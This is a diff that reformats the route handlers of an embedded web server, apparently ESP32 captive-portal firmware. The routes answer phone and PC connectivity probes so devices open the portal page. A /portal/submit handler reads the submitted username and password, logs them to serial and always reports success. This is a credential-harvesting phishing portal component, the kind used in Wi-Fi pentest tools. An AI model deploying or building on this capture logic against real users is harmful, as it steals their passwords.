@@ -640,53 +640,36 @@ a{color:#58a6ff;text-decoration:none;margin-top:1rem;display:inline-block;font-s
 // ─────────────────────────────────────────────────────────────────────────────
 static void cp_routes() {
   // Main dashboard
-  server.on("/",HTTP_GET,[](){
-    server.send_P(200,"text/html",CP_DASHBOARD);
-  });
-  server.on("/index.html",HTTP_GET,[](){
-    server.send_P(200,"text/html",CP_DASHBOARD);
-  });
+  server.on("/", HTTP_GET, []() { server.send_P(200, "text/html", CP_DASHBOARD); });
+  server.on("/index.html", HTTP_GET, []() { server.send_P(200, "text/html", CP_DASHBOARD); });
 
   // Portal pages
-  server.on("/portal",HTTP_GET,[](){
-    server.send_P(200,"text/html",CP_PORTAL);
-  });
-  server.on("/portal/",HTTP_GET,[](){
-    server.send_P(200,"text/html",CP_PORTAL);
-  });
-  server.on("/portal/success",HTTP_GET,[](){
-    server.send_P(200,"text/html",CP_SUCCESS);
-  });
+  server.on("/portal", HTTP_GET, []() { server.send_P(200, "text/html", CP_PORTAL); });
+  server.on("/portal/", HTTP_GET, []() { server.send_P(200, "text/html", CP_PORTAL); });
+  server.on("/portal/success", HTTP_GET, []() { server.send_P(200, "text/html", CP_SUCCESS); });
 
   // Captive portal detection responses (iOS, Android, Windows probes)
-  server.on("/generate_204",HTTP_GET,[](){
-    server.send(302,"text/plain","");
-    server.sendHeader("Location","http://192.168.4.1/portal",true);
+  server.on("/generate_204", HTTP_GET, []() {
+    server.send(302, "text/plain", "");
+    server.sendHeader("Location", "http://192.168.4.1/portal", true);
   });
-  server.on("/hotspot-detect.html",HTTP_GET,[](){
-    server.send_P(200,"text/html",CP_PORTAL);
+  server.on("/hotspot-detect.html", HTTP_GET, []() { server.send_P(200, "text/html", CP_PORTAL); });
+  server.on("/ncsi.txt", HTTP_GET, []() { server.send(200, "text/plain", "Microsoft NCSI"); });
+  server.on("/connecttest.txt", HTTP_GET,
+            []() { server.send(200, "text/plain", "Microsoft Connect Test"); });
+  server.on("/redirect", HTTP_GET, []() {
+    server.sendHeader("Location", "http://192.168.4.1/portal", true);
+    server.send(302, "text/plain", "");
   });
-  server.on("/ncsi.txt",HTTP_GET,[](){
-    server.send(200,"text/plain","Microsoft NCSI");
-  });
-  server.on("/connecttest.txt",HTTP_GET,[](){
-    server.send(200,"text/plain","Microsoft Connect Test");
-  });
-  server.on("/redirect",HTTP_GET,[](){
-    server.sendHeader("Location","http://192.168.4.1/portal",true);
-    server.send(302,"text/plain","");
-  });
-  server.on("/portal/submit",HTTP_POST,[](){
+  server.on("/portal/submit", HTTP_POST, []() {
     // Log credentials if present
-    String user=server.hasArg("user")?server.arg("user"):"";
-    String pass=server.hasArg("pass")?server.arg("pass"):"";
-    Serial.printf("[PORTAL] Credentials: user=%s pass=%s\n",user.c_str(),pass.c_str());
+    String user = server.hasArg("user") ? server.arg("user") : "";
+    String pass = server.hasArg("pass") ? server.arg("pass") : "";
+    Serial.printf("[PORTAL] Credentials: user=%s pass=%s\n", user.c_str(), pass.c_str());
     // Always succeed after a brief delay simulation
-    server.send(200,"application/json","{\"ok\":1}");
+    server.send(200, "application/json", "{\"ok\":1}");
   });
 
   // 404 handler
-  server.onNotFound([](){
-    server.send_P(404,"text/html",CP_404);
-  });
+  server.onNotFound([]() { server.send_P(404, "text/html", CP_404); });
 }
